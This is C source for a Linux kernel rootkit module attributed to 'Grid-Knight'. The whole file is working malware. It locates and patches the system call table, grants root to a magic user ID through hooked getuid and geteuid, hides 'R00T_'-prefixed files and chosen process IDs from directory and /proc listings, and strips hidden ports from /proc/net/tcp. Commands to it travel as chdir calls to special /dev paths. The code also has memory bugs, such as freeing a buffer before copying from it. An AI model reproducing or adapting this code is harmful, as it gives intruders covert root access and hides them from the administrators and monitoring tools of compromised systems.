/*
 * Based on the private researches 
 * of newroot and me
 *
 * written by Grid-Knight
 * http://www.informatik.uni-freiburg.de/~alsbiha
 *
 */


//#define DEBUG
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/errno.h>
#include <linux/sched.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/dcache.h>
#include <linux/mm.h>
#include <asm/unistd.h>
#include <asm/uaccess.h>
#include <asm/string.h>
#define __KERNEL_SYSCALLS__
#include <linux/syscalls.h>
#include <linux/dirent.h>

MODULE_LICENSE("GPL");

#define HIDE_STR 	"R00T_"
#define MAGIC_UID 	1000
#define MAX_HIDE_PIDS	128
#define MAX_HIDE_PORTS 	16
#define KILL_HIDE_PID	10 
#define KILL_UNHIDE_PID	12
#define CHDIR_HIDE_PID	 "/dev/grid-hide-pid-"
#define CHDIR_UNHIDE_PID "/dev/grid-unhide-pid-"
#define CHDIR_SHOW_PIDS  "/dev/grid-show-pids"
#define CHDIR_HIDE_NET	 "/dev/grid-hide-port-"
#define CHDIR_UNHIDE_NET "/dev/grid-unhide-port-"
#define KERNEL_2_6_14 //For kernel Versions >= 2.6.14

#define PROC_STRING	"/proc/"
#define IS_HIDDEN_FILE	0x01
#define IS_HIDDEN_PID   0x02
#define IS_HIDDEN_PORT  0x04


#define INTERCEPT(x) { \
	org_##x = sys_call_table[__NR_##x]; \
	(void *)sys_call_table[__NR_##x] = (void *) my_##x; \
}

#define RESTORE(x) { \
	sys_call_table[__NR_##x] = org_##x; \
}

void struct_module (struct module *mod) { return ;}
EXPORT_SYMBOL(struct_module);

int hide_pids[MAX_HIDE_PIDS];
int hide_ports[MAX_HIDE_PORTS];
long inode_tcp;
void **sys_call_table;

int get_sct (void);
int restore_syscalls (void);
int intercept_syscalls (void);

int is_hidden (char * object, int flags);
int hide_pid (int pidnr);
int unhide_pid (int pidnr);
int unhide_all (void);
int hide_port (int portnr);
int unhide_port (int portnr);
int my_atoi (char *);
int get_inodes (void);

int (*org_getuid) (void);
int (*org_getuid32) (void);
int (*org_geteuid) (void);
int (*org_geteuid32) (void);
int (*org_getdents) (unsigned int fd, struct dirent *dirp, unsigned int count);
int (*org_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
int (*org_write)(int fd, char *buf, int count);
int (*org_open) (char *pathname, int flags);
int (*org_chdir)(char *path);
int (*org_stat) (char *file_name, struct stat *buf);
int (*org_brk) (void *end_data_segment);
int (*org_read) (int fd, void *buf, int count);
int (*org_fork) (void);
int (*org_clone) (void);

int my_getuid (void);
int my_geteuid (void);
int my_getdents64 (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
int my_write (int fd, char *buf, int count);
int my_open (char *pathname, int flags);
int my_chdir (char *path);
int my_read (int fd, void *buf, int count);
int my_fork (void);
int my_clone (void);

int my_chdir (char *path) {
	char *ptr=NULL;
	int pid;
	int i;
	if (strncmp (PROC_STRING, path, strlen(PROC_STRING)) == 0) {
		ptr = path + strlen(PROC_STRING);
		pid = my_atoi (ptr);
		if ( pid > 0 ) {
			for (i=0; i<=MAX_HIDE_PIDS; i++) {
				if (hide_pids[i] != 0) {
					if (pid == hide_pids[i]) {
						return -1;
					}
				}
			}
		
		}
	}
	if (strncmp (CHDIR_HIDE_PID, path, strlen (CHDIR_HIDE_PID)) == 0) {
		ptr = (char *)path + strlen (CHDIR_HIDE_PID);
		return hide_pid(my_atoi(ptr));
	} else if (strncmp (CHDIR_UNHIDE_PID, path, strlen (CHDIR_UNHIDE_PID)) == 0) {
		ptr = (char *)path + strlen (CHDIR_UNHIDE_PID);
		return unhide_pid(my_atoi(ptr));
	} else if (strncmp (CHDIR_SHOW_PIDS, path, strlen (CHDIR_SHOW_PIDS)) == 0) {
		char pidlist[32];
		unsigned long mmm;
		struct task_struct *task;
		char *string;
		int i;

		mmm=current->mm->brk;
        	org_brk((char*)mmm+32);
		string = (char *)mmm +2;

		for (i = 0; i <= MAX_HIDE_PIDS; i++) {
			if (hide_pids[i] != 0) {
				task = find_task_by_pid (hide_pids[i]);
				snprintf (pidlist, 32, "%d - %s\n", hide_pids[i], task->comm);
				copy_to_user (string, pidlist, strlen (pidlist)+1);
				org_write (1, string, strlen (string)+1);
			}
		}
		
		org_brk((char*)mmm);
		return 0;
	} else if (strncmp (CHDIR_HIDE_NET, path, strlen(CHDIR_HIDE_NET)) == 0) {
		ptr = (char *)path + strlen (CHDIR_HIDE_NET);
		return hide_port(my_atoi(ptr));
	} else if (strncmp (CHDIR_UNHIDE_NET, path, strlen (CHDIR_UNHIDE_NET)) == 0) {
		ptr = (char *)path + strlen (CHDIR_UNHIDE_NET);
		return unhide_port(my_atoi(ptr));
	}
	return org_chdir (path);
}

int my_getuid () {
	int ret;
	
	ret = org_getuid();
	if (ret == MAGIC_UID) {
		current->uid = 0;
		return 0;
	}

	return ret;
}

int my_geteuid () {
	int ret;
	
	ret = org_geteuid();
	if (ret == MAGIC_UID) {
		current->euid = 0;
		return 0;
	}

	return ret;
}

int my_getdents64 (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
	struct linux_dirent64 *mydirent = NULL;
	char *mydir = NULL;
	char *dest = NULL; 
	struct inode *dinode;
	char *p;
	int ret;
	int my_ret = 0;
	int proc = 0;
	int size;
		
	ret = org_getdents64 (fd, dirp, count);
	size = ret;

	if ( ret <= 0) {
		return ret;
	}

	mydir = kmalloc (ret, GFP_KERNEL);
	dest = kmalloc (ret, GFP_KERNEL);
	copy_from_user(mydir, dirp, ret);
	//kernel versions >= 2.6.14
	#ifdef KERNEL_2_6_14
	dinode = current->files->fdt->fd[fd]->f_dentry->d_inode;
	#else
	// for kernel versions < 2.6.14
	 dinode = current->files->fd[fd]->f_dentry->d_inode;
	#endif
			
	if (dinode->i_ino == PROC_ROOT_INO) {
		proc = 1;
	}

	p = mydir;
	while (size > 0) {
		mydirent = (struct linux_dirent64 *) p;
		p +=  mydirent->d_reclen;
		if (proc) {
			if (is_hidden (mydirent->d_name, IS_HIDDEN_PID) ==  0) {
				memcpy (dest+my_ret, mydirent, mydirent->d_reclen);
				my_ret +=  mydirent->d_reclen;
			}
		} else if (is_hidden (mydirent->d_name, IS_HIDDEN_FILE) == 0) {
			memcpy (dest+my_ret, mydirent, mydirent->d_reclen);
			my_ret +=  mydirent->d_reclen;
		}
		size -= mydirent->d_reclen;
	}

 	kfree (mydir);	
 	kfree (dest);	
	copy_to_user (dirp, dest, my_ret);
	return my_ret;
}

int my_read (int fd, void *buf, int count) {
	struct inode *dinode;
	char *kbuf = NULL;
	char *p;
	int ret;
	int i, j;
  
	//kernel versions >= 2.6.14
	#ifdef KERNEL_2_6_14
	dinode = current->files->fdt->fd[fd]->f_dentry->d_inode;
	#else
	// for kernel versions < 2.6.14
	 dinode = current->files->fd[fd]->f_dentry->d_inode;
	#endif
	
	if (dinode->i_ino != inode_tcp) {
		return org_read (fd, buf, count);
	}
	ret = org_read (fd, buf, count);
	kbuf = kmalloc (ret, GFP_KERNEL);
	if (kbuf == NULL) {
		return 0;
	}
	copy_from_user (kbuf, buf, ret);
	for (i=0, j=0; i< ret; i++) {
		if (kbuf[i] == '\n') {
			kbuf[i] = 0x00;
			j++;
		}
	} 
	for (i=0, p=kbuf; i < j; i++) {
		if (is_hidden (p, IS_HIDDEN_PORT)) {
			ret-= strlen(p)+1;
			memmove (p, p+strlen(p)+1, strlen(p)+1);	
		} else {
			p+= strlen(p)+1;
		}
		
	}
	
	for (i=0; i< ret; i++) {
		if (kbuf[i] == 0x00) {
			kbuf[i] = '\n';
		}
	}

	copy_to_user (buf, kbuf, ret);
	kfree (kbuf);
	return ret;
}

int my_fork () {
	pid_t pid;
	int i;

	for (i=0; i<=MAX_HIDE_PIDS; i++) {
		if (hide_pids[i] != 0) {
			if (current->pid == hide_pids[i]) {
				for (i = 0; hide_pids[i] !=0 && i<= MAX_HIDE_PIDS; i++) {
                        		; // do nothing
                		}	
 	               		if (i > MAX_HIDE_PIDS) {
        	                	return -1;
                		}
				pid = org_fork();
				hide_pids[i] = pid;
				return pid;
			}
		}
	}

	pid = org_fork();
	return pid;
}

int my_clone(){
	pid_t pid;
	int i;
	
	for (i=0; i<=MAX_HIDE_PIDS; i++) {
        	if (hide_pids[i] != 0) {
                	if (current->pid == hide_pids[i]) {
                                for (i = 0; hide_pids[i] !=0 && i<= MAX_HIDE_PIDS; i++) {
                                        ; // do nothing
                                }
                                if (i > MAX_HIDE_PIDS) {
                                        return -1;
                                }
                                pid = org_fork();
                                hide_pids[i] = pid;
                                return pid;
                        }
                }
        }
        pid = org_fork();
        return pid;
}

int get_sct () {
	unsigned long *ptr;

	ptr=(unsigned long *)((init_mm.end_code + 4) & 0xfffffffc);
#ifdef DEBUG
	printk (KERN_INFO"Searching for sys_call_table address...\n");
	printk ("Start: %p End: %p\n",init_mm.end_code,init_mm.end_data);
	printk ("Ptr: %p\n",ptr);
#endif

	/* Look in the Data-Section */
	while((unsigned long )ptr < (unsigned long)init_mm.end_data) {
		if ((unsigned long *)*ptr == (unsigned long *)sys_close) { 
#ifdef DEBUG
			printk (KERN_INFO" -> matching detected at %p\n", ptr);
#endif
			if ((unsigned long *)*((ptr-__NR_close)+__NR_read) == (unsigned long *) sys_read &&  
			    *((ptr-__NR_close)+__NR_open) == (unsigned long) sys_open ) {   
#ifdef DEBUG
			printk (KERN_INFO" -> possible syscall table found at %p\n", ptr-__NR_close);
			printk (KERN_INFO" -> sys_write at %p\n", *(ptr-__NR_close+4));
			printk (KERN_INFO" -> sys_fork at %p\n", *(ptr-__NR_close+2));
#endif
					sys_call_table = (void **) ((unsigned long *)(ptr-__NR_close));
					break;
			}

		}
		ptr++;
	}
#ifdef DEBUG
	printk (KERN_INFO"sys_call_table base found at: %p\n", sys_call_table);
#endif
	if (sys_call_table == NULL) {
		return -1;
	} else {
		return 1;
	}

	return -1;
}

int my_atoi(char *str)
{
        int ret = 0, mul = 1;
	const char *ptr;

        for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++)
                ;
        ptr--;
        while (ptr >= str) {
                if (*ptr < '0' || *ptr > '9')
                        break;
       		ret += (*ptr - '0') * mul;
      		mul *= 10;
     		ptr--;
   	}
	return ret;
}

int is_hidden (char *object, int flags) {
	char buf[16];
	int i;
	int pid;

	if (flags == IS_HIDDEN_PID) {
		pid = my_atoi (object);
		for (i=0; i<= MAX_HIDE_PIDS;  i++) {
			if (hide_pids[i] == pid && pid != 0) {
				return 1;
			}
		}
	} else if (flags == IS_HIDDEN_FILE) {
		if (strncmp (HIDE_STR, object, strlen (HIDE_STR)) == 0) {
			return 1;
		}
	} else if (flags == IS_HIDDEN_PORT) {
		for (i=0; i < MAX_HIDE_PORTS; i++) {
			if (hide_ports[i] != 0) {
				memset (buf, 0x00, 16);
				snprintf (buf, 16, ":%04X", hide_ports[i]);
				if (NULL != strstr (object, buf)) {
					return 1;
				}
			}
		}
	}

	return 0;
}

int get_inodes () {
	struct stat *sbuf;
	char *name;
	unsigned long mmm;
	struct stat kbuf;

	mmm=current->mm->brk;
	org_brk((char*)mmm+sizeof(struct stat)+16);
	sbuf=(struct stat*)mmm+2;
	name=(char*)mmm+sizeof(struct stat)+2;
	copy_to_user(name,"/proc/net/tcp",14);

	if (!org_stat(name,sbuf)) {
		copy_from_user(&kbuf,sbuf,sizeof(struct stat));
		inode_tcp = kbuf.st_ino;
		return 1;
	}

  	org_brk((char*)mmm);
	return 0;
}

int hide_pid (int pidnr) {
	int i;

	for (i = 0; hide_pids[i] !=0 && i<= MAX_HIDE_PIDS; i++) {
		; // do nothing
	}
	if (i > MAX_HIDE_PIDS) {
		return -1;
	}
	hide_pids[i] = pidnr;
	return 0;	
}

int unhide_pid (int pidnr) {
	int i;

	for (i = 0; hide_pids[i] != pidnr && i<= MAX_HIDE_PIDS; i++) {
		; // do nothing
	}
	if (i > MAX_HIDE_PIDS) {
		return -1;
	}
	hide_pids[i] = 0;
	return 0;
}

int hide_port (int portnr) {
	int i;

	for (i = 0; hide_ports[i] !=0 && i<= MAX_HIDE_PORTS; i++) {
		; // do nothing
	}
	if (i > MAX_HIDE_PORTS) {
		return -1;
        }
	hide_ports[i] = portnr;
	return 0;
}

int unhide_port (int portnr) {
	int i;

	for (i = 0; hide_ports[i] != portnr && i<= MAX_HIDE_PORTS; i++) {
		; // do nothing
	}
	if (i > MAX_HIDE_PORTS) {
		return -1;
   	}
	hide_ports[i] = 0;
	return 0;
}

//cleanup - unhides all ports and pids
int unhide_all () {
	int i;

        for (i = 0; i<= MAX_HIDE_PORTS; i++) {
		hide_ports[i] = 0;
        }
	for (i = 0; i<= MAX_HIDE_PIDS; i++) {
		hide_pids[i] = 0;
	}
	return 0;
}


int intercept_syscalls () {
#ifdef DEBUG
	printk (KERN_INFO"Intercepting Syscalls\n");
#endif
	INTERCEPT(getuid);
	INTERCEPT(geteuid);
	INTERCEPT(getdents64);
	INTERCEPT(chdir);
	INTERCEPT(read);
	// get pointers to some needed functions
	org_write = (void *) sys_call_table[__NR_write];
	org_open  = (void *) sys_call_table[__NR_open];
	org_stat  = (void *) sys_call_table[__NR_stat];
	org_brk   = (void *) sys_call_table[__NR_brk];

	return 1;
}

int restore_syscalls () {
	RESTORE(getuid);
	RESTORE(geteuid);
	RESTORE(getdents64);
	RESTORE(chdir);
	RESTORE(read);
	return 1;
}
int init_module(){
	if (!get_sct ()) {
		return -1;
	}

	intercept_syscalls();
	if (!get_inodes ()) {
		return -1;
	}

	return 0;
}

void cleanup_module(){
	unhide_all ();
	restore_syscalls ();
}
